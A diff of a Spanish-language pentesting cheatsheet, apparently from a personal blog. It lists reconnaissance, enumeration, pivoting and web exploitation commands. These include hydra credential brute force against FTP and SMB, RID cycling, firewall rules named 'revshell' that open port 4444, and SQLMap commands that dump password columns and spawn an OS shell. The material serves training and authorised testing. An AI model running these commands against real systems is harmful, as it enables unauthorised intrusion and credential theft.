@@ -1,46 +1,45 @@
 ---
 title: "Cheatsheet"
-icon: fas fa-info-circle
-order: 4
+pin: true
 ---
 
 Esta cheatsheet agrupa una variedad de comandos y scripts útiles para realizar Pentesting. Diseñada como una herramienta dinámica, esta recopilación se mantendrá en constante evolución, actualizándose con nuevos conocimientos y conceptos que adquiera con el tiempo.
 
-# 1 Reconocimiento
+## 1. Reconocimiento
 
-## 1.1 whois
+### 1.1. whois
 ```bash
 whois <URL>
 ```
 
-## 1.2 host
+### 1.2. host
 ```bash
 host <URL>
 ```
 
-## 1.3 dnsrecon
+### 1.3. dnsrecon
 ```bash
 dnsrecon -d <URL>
 ```
 
-## 1.4 wafw00f
+### 1.4. wafw00f
 ```bash
 wafw00f <URL>
 ```
 
-## 1.5 sublist3r
+### 1.5. sublist3r
 ```bash
 sublist3r -d <URL> -e <engines>
 ```
 
-## 1.6 theHarvester
+### 1.6. theHarvester
 ```bash
 theHarvester -d <URL> -b <engines>
 ```
 
-# 2 Descubrimiento de Hosts / Enumeración
+## 2. Descubrimiento de Hosts / Enumeración
 
-## 2.1 fping
+### 2.1. fping
 
 ```bash
 fping -a -g <IP-RANGE> 2>/dev/null
@@ -62,16 +61,17 @@ fping -a -g 10.10.10.0/24 2>/dev/null
 nmap -sn -iL hosts.txt
 ```
 
-## 2.2 Nmap
+### 2.2. Nmap
 
-### 2.2.1 Descubrimiento de host - Ping Scan
+#### 2.2.1. Descubrimiento de host - Ping Scan
 
 ```bash
 sudo nmap -sn 10.10.10.0/24
 ```
 
 - `-sn` Esta opción le dice a Nmap que no haga un escaneo de puertos después del descubrimiento de hosts y que sólo imprima los hosts disponibles que respondieron a la traza icmp.
-### 2.2.2 Escaneo de puertos
+
+#### 2.2.2. Escaneo de puertos
 
 ```bash
 sudo nmap -p- --open -Pn -n 10.10.10.5 -vvv -oG scanPorts
@@ -85,7 +85,8 @@ Parámetros utilizados:
 - `-Pn`: Desactiva el descubrimiento de host por medio de ping.
 - `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.
 - `-oG`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es un formato _grepeable_, el cual almacena todo en una sola línea. De esta forma, es más sencillo procesar y obtener los puertos abiertos por medio de expresiones regulares, en conjunto con otras utilidades como pueden ser grep, awk, sed, entre otras.
-### 2.2.3 Versión y Servicio
+
+#### 2.2.3. Versión y Servicio
 
 ```bash
 sudo nmap -sCV -p<PORTS> 10.10.10.5 -oN targeted -vvv 
@@ -96,26 +97,26 @@ sudo nmap -sCV -p<PORTS> 10.10.10.5 -oN targeted -vvv
 - `-oN`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es el formato por defecto de nmap.
 - `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.
 
-### 2.2.4 UDP (top 100)
+#### 2.2.4. UDP (top 100)
 
 ```bash
 sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast 10.10.10.5
 ```
 
-### 2.2.5 UDP (top 20)
+#### 2.2.5. UDP (top 20)
 ```bash
 sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 10.10.10.5
 ```
 
-### 2.2.5 Obtener ayuda sobre scripts
+#### 2.2.6. Obtener ayuda sobre scripts
 
 ```bash
 nmap --script-help="http-*"
 ```
 
-## 2.3 Enrutamiento
+### 2.3. Enrutamiento
 
-### 2.3.1 Mostrar la tabla de enrutamiento
+#### 2.3.1. Mostrar la tabla de enrutamiento
 
 En Windows y Linux podemos usar:
 
@@ -128,7 +129,7 @@ En Linux, podemos usar:
 ```bash
 ip route
 ```
-#### 2.3.2 Configurar una ruta con `ip route`
+#### 2.3.2. Configurar una ruta con `ip route`
 
 ```bash
 ip route add <Network To Access> via <Gateway Address>
@@ -142,11 +143,11 @@ ip route add 10.10.10.0/24 via 10.10.10.1
 
 Esto añade una ruta a la red 10.10.10.0/24 a través del router 10.10.10.1.
 
-# 3 Servicios Comunes
+## 3. Servicios Comunes
 
 En esta sección, se presentan técnicas de enumeración, explotación e interacción para servicios comunes que podrían ser descubiertos a través del escaneo.
 
-## 3.1 TCP
+### 3.1. TCP
 
 |**Puerto**|**Servicio**|
 |---|---|
@@ -163,7 +164,7 @@ En esta sección, se presentan técnicas de enumeración, explotación e interac
 |443|HTTPS|
 
 
-## 3.2 UDP
+### 3.2. UDP
 
 |**Puerto**|**Servicio**|
 |---|---|
@@ -173,11 +174,11 @@ En esta sección, se presentan técnicas de enumeración, explotación e interac
 |69|TFTP|
 |161|SNMP|
 
-## 3.3 FTP (21)
+### 3.3. FTP (21)
 
 El Protocolo de transferencia de archivos es un protocolo de red para la transferencia de ficheros entre sistemas conectados a una red TCP, basado en la arquitectura cliente-servidor.
 
-### 3.3.1 Nmap
+#### 3.3.1. Nmap
 
 Cuando lanzamos una enumeración usando Nmap, se utilizan por defecto una serie de scripts que comprueban si se permite el acceso de forma anonima.
 
@@ -185,7 +186,7 @@ Cuando lanzamos una enumeración usando Nmap, se utilizan por defecto una serie 
 - `anonymous`
 - `ftp:ftp`
 
-### 3.3.2 Conexión al servidor FTP
+#### 3.3.2. Conexión al servidor FTP
 
 ```bash
 # -A: Esta opción es específica del cliente FTP y suele utilizarse para activar 
@@ -199,7 +200,7 @@ nc -nvc 192.168.1.10 21
 telnet 192.168.1.10 21
 ```
 
-### 3.3.3 Interactuar con el cliente FTP
+#### 3.3.3. Interactuar con el cliente FTP
 
 ```bash
 ftp> anonymous # usuario
@@ -225,26 +226,26 @@ ftp> mdelete *.txt # borra multiples archivos que cumplan con el patrón
 ftp> exit # abandona la conexión ftp
 ```
 
-### 3.3.4 Fuerza bruta de credenciales
+#### 3.3.4. Fuerza bruta de credenciales
 
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10
 ```
 
-### 3.3.5 Arhivos de configuración
+#### 3.3.5. Arhivos de configuración
 
 - `/etc/ftpusers`
 - `/etc/vsftpd.conf`
 - `/etc/ftp.conf`
 - `/etc/proftpd.conf`
 
-### 3.3.6 Descargar archivos
+#### 3.3.6. Descargar archivos
 
 ```bash
 wget -m ftp://anonymous:anonymous@192.168.1.10
 ```
 
-## 3.4 SMB (445)
+### 3.4. SMB (445)
 
 SMB (Server Message Block) es un protocolo diseñado para la compartición de archivos en red, facilitando la interconexión de archivos y periféricos como impresoras y puertos serie entre ordenadores dentro de una red local (LAN).
 - SMB utiliza el puerto 445 (TCP). Sin embargo, originalmente, SMB se ejecutaba sobre NetBIOS utilizando puerto 139.
@@ -254,7 +255,7 @@ El protocolo SMB utiliza dos niveles de autenticación, a saber:
 - **Autenticación de usuario**: los usuarios deben proporcionar un nombre de usuario y una contraseña para autenticarse con el servidor SMB para acceder a un recurso compartido.
 - **Autenticación de recurso compartido**: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido.
 
-### 3.4.1 Nmap
+#### 3.4.1. Nmap
 
 Scripts de `nmap` utiles para este servicio:
 
@@ -274,7 +275,7 @@ Sintaxis:
 nmap -p445 --script <script> 192.168.1.10
 ```
 
-### 3.4.2 smbclient
+#### 3.4.2. smbclient
 
 Es un cliente que nos permite acceder a recursos compartidos en servidores SMB.
 
@@ -289,7 +290,7 @@ smbclient //192.168.1.10/Public -N
 smbclient -L 192.168.1.10 -N
 ```
 
-### 3.4.3 smbmap
+#### 3.4.3. smbmap
 
 SMBMap permite a los usuarios enumerar las unidades compartidas samba en todo un dominio. Enumera las unidades compartidas, los permisos de las unidades, el contenido compartido, la funcionalidad de carga/descarga, la coincidencia de patrones de descarga automática de nombres de archivo e incluso la ejecución de comandos remotos.
 
@@ -321,7 +322,7 @@ smbmap -H 192.168.1.10 -u <USER> -p <PASSWORD> --download 'tmp/file'
 smbmap -u <USER> -p <PASSWORD> -H 192.168.1.10 -x 'ipconfig'
 ```
 
-### 3.4.4 enum4linux
+#### 3.4.4. enum4linux
 
 Enum4linux es una herramienta utilizada para extraer información de hosts de Windows y Samba. La herramienta está escrita en Perl y envuelta en herramientas de samba `smbclient`, `rpcclient`, `net` y `nslookup`.
 
@@ -347,7 +348,7 @@ enum4linux -i 192.168.1.10
 enum4linux -r -u <user> -p <password> 192.168.1.10
 ```
 
-#### 3.4.5 NetExec
+#### 3.4.5. NetExec
 
 ```bash
 # Enumerar hosts
@@ -369,7 +370,7 @@ crackmapexec smb VICTIM_IPS -u '' -p '' --shares
 crackmapexec smb VICTIM_IPS -u USERNAME -p 'PASSWORD' --shares --filter-shares READ WRITE
 ```
 
-### 3.4.6 Rpcclient
+#### 3.4.6. Rpcclient
 
 rpcclient es una utilidad que forma parte del conjunto de herramientas Samba. Se utiliza para interactuar con el protocolo Remote Procedure Call (RPC) de Microsoft, que se utiliza para la comunicación entre los sistemas basados en Windows y otros dispositivos. rpcclient se utiliza principalmente para fines de depuración y pruebas, y se puede utilizar para consultar y manipular sistemas remotos.
 
@@ -408,13 +409,13 @@ La sintaxis básica del parámetro `-c` es la siguiente:
 rpcclient -U username //192.168.1.10 -c "command1; command2; command3"
 ```
 
-### 3.4.7 RID Cycling Attack
+#### 3.4.7. RID Cycling Attack
 
 ```bash
 seq 1 5000 | xargs -P 50 -I{} rpcclient -U "" 30.30.30.4 -N -c "lookupsids S-1-22-1-{}" 2>&1
 ```
 
-### 3.4.8 SMB desde Windows
+#### 3.4.8. SMB desde Windows
 ```powershell
 # listar recursos compartidos
 net share
@@ -439,7 +440,7 @@ Recursos compartidos comunes en Windows:
 - `SYSVOL` sólo en DCs
 - `NETLOGON` sólo en los DC
 
-### 3.4.9 Interactuar con el cliente SMB
+#### 3.4.9. Interactuar con el cliente SMB
 
 ```bash
 smb: \> help # muestra la ayuda
@@ -448,23 +449,244 @@ smb: \> put file.txt # subir un archivo
 smb: \> get file.txt # descargar un archivo
 ```
 
-### 3.4.10 Montar una carpeta compartida
+#### 3.4.10. Montar una carpeta compartida
 
 ```bash
 mount -t cifs -o "username=user,password=password" //192.168.1.10/shared_folder /mnt/shared_folder
 ```
 
-### 3.4.11 Fuerza bruta de credenciales
+#### 3.4.11. Fuerza bruta de credenciales
 
 ```bash
 nmap --script smb-brute -p 445 192.168.1.10
 hydra -l admin -P /usr/share/wordlist/rockyou.txt 192.168.1.10 smb
 ```
 
-### 3.4.12 Metasploit
+#### 3.4.12. Metasploit
 
 Modulos utiles:
 
 - auxiliary/scanner/smb/smb2
 - auxiliary/scanner/smb/smb_login
 - auxiliary/scanner/smb/smb_enumusers
+
+## 4. Enumeración Web
+
+### 4.1. Gobuster
+
+Fuzzing de directorios
+
+```bash
+$ gobuster dir -u <URL> -w <WORDLIST>
+```
+
+Ejemplo:
+
+```bash
+gobuster dir -u http://192.168.1.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
+```
+
+Fuzzing a través de proxychains
+
+```bash
+gobuster dir -u http://10.10.10.4/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,php,txt --proxy socks5://127.0.0.1:4444
+```
+
+### 4.2. Fuff
+
+Fuzzing de directorios 
+
+```bash
+ffuf -c -u <URL>/FUZZ -w <WORDLIST> -t 20
+```
+
+Ejemplo:
+
+```bash
+ffuf -u http://192.168.1.10/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
+```
+
+Fuzzing a través de proxychains
+
+```bash
+ffuf -c -recursion-depth 2 -x socks5://localhost:4444 -u http://20.20.20.10/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php
+```
+
+### 4.3. Dirb
+
+```bash
+dirb <URL> <WORDLIST>
+```
+
+Ejemplo:
+
+```bash
+dir http://192.168.1.10/ /usr/share/wordlists/dirb/common.txt
+```
+
+### 4.4. Wfuzz
+
+```bash
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.target.com' --hw 324 http://target
+```
+
+### 4.5. Nikto
+
+```bash
+nikto -h http://192.168.1.10/
+```
+
+## 5. Enumeración de CMS
+### 5.1. Wordpress
+
+Enumeración de temas y plugins Wordpress
+
+#### 5.1.1. Nmap
+
+```bash
+nmap -p80 --script http-wordpress-enum --script-args http-wordpress-enum.root='/wordpress',search-limit=1000 remote.nyx
+```
+
+#### 5.1.2. Wpscan
+
+```bash
+wpscan --url http://192.168.1.10/wordpress --api-token $WP_TOKEN --plugins-detection aggressive
+```
+> La variable de entorno `$WP_TOKEN` contiene el token generado en la web [https://wpscan.com/](https://wpscan.com/)
+{: .prompt-info }
+
+#### 5.1.3. Nuclei
+
+```bash
+nuclei -u http://remote.nyx/wordpress/ -tags fuzz -t /home/d4redevil/.local/nuclei-templates/http/fuzzing/wordpress-plugins-detect.yaml
+```
+
+#### 5.1.4. Gobuster
+
+```bash
+gobuster dir -u http://remote.nyx/wordpress/ -w /usr/share/seclists/Discovery/WebContent/CMS/wp-plugins.fuzz.txt
+```
+### 5.1. Joomla
+
+#### 5.1.1. joomscan
+
+```bash
+joomscan -u http://192.168.1.10
+```
+
+## 6. Pivoting
+
+### 6.1. Chisel
+
+#### Server
+
+```bash
+./chisel server --reverse -p 8000
+```
+
+#### Client
+
+```bash
+./chisel client 10.10.10.5:8000 R:3000:127.0.0.1:3000
+./chisel client 10.10.10.5:8000 R:4444:socks
+```
+
+### 6.2. Socat
+
+```bash
+./socat tcp-listen:2222,fork,reuseaddr tcp:10.10.10.5:8000
+```
+
+Exponer un puerto local
+
+```bash
+socat TCP-LISTEN:8282,fork TCP:127.0.0.1:8080 &
+```
+
+> En este caso, el puerto `8080` no esta expuesto fuera del equipo local, pero con el comando anterior exponemos el puerto hacia fuera a través del puerto `8282`.
+{: .prompt-tip }
+
+### 6.3. Escaneo de puertos
+
+Escaneo de puertos a través de proxychains usando hilos
+
+```bash
+seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -p{} -open -T5 -Pn -n 10.10.10.16 -vvv -oN targeted 2>&1 | grep "tcp open"
+```
+
+### 6.4. Descubrimiento de hosts Windows
+
+```bash
+arp -d
+for /L %a (1,1,254) do @start /b ping 40.40.40.%a -w 100 -n 2 >nul
+arp -a
+```
+
+### 6.5. Descubrimiento de hosts Linux
+
+```bash
+#!/bin/bash
+
+octetos=$(echo "$1" | grep -oE '([0-9]{1,3}\.){2}[0-9]{1,3}')
+
+for i in $(seq 1 254); do
+        timeout 1 bash -c "ping -c 1 $octetos.$i" &>/dev/null && echo "[+] Host $octetos.$i - ACTIVO" &
+done; wait
+```
+
+```bash
+./host-discovery.sh 192.168.1.0
+```
+
+### 6.6. Descubrimiento de puertos abiertos Linux
+
+```bash
+#!/bin/bash
+
+for port in $(seq 1 65535); do
+    timeout 1 bash -c "echo '' > /dev/tcp/$1/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
+done; wait
+```
+
+```bash
+./port-discovery.sh 192.168.1.10
+```
+
+### 6.7. Netsh
+
+#### 6.7.1. Mostrar la configuración actual del reenvío de puertos. 
+
+```powershell
+netsh interface portproxy show all
+```
+
+#### 6.7.2. Port Forwarding
+
+```powershell
+netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=5555 connectaddress=0.0.0.0
+```
+
+#### 6.7.3. Abrimos el puerto en el FIREWALL
+
+```powershell
+netsh advfirewall firewall add rule name=revshell protocol=TCP dir=in localport=4444 action=allow (IN)
+netsh advfirewall firewall add rule name=revshell protocol=TCP dir=out localport=4444 action=allow (OUT)
+```
+
+### 7. Explotación Web
+
+#### SQLMap (SQL Injection)
+
+```bash
+$ sqlmap -u <URL> -p <PARAMETER> [options]
+```
+
+```bash
+$ sqlmap -u http://192.168.1.10/index.php?id=10 --dbs                                           # Lista todas las base de datos
+$ sqlmap -u http://192.168.1.10/index.php?id=10 -D test --tables                                # Muestra todas las tablas en la base de datos
+$ sqlmap -u http://192.168.1.10/index.php?id=10 -D test -T users --columns                      # Lista todas las columnas
+$ sqlmap -u http://192.168.1.10/index.php?id=10 -D test -T users -C admin,password,email --dump # Muestra los valores de las columnas indicadas
+$ sqlmap -u 'http://192.168.1.10/index.php?id=10' -p id --technique-U                           # Enumera el parámetro id usando la técnica union
+$ sqlmap -u 'http://192.168.1.10/index.php?id=31' --dump                                        # Devulve el contenido de la base de datos 
+$ sqlmap -u 'http://192.168.1.10/index.php?id=7' -os-shell                                      # Lanza un prompt interativo
+```
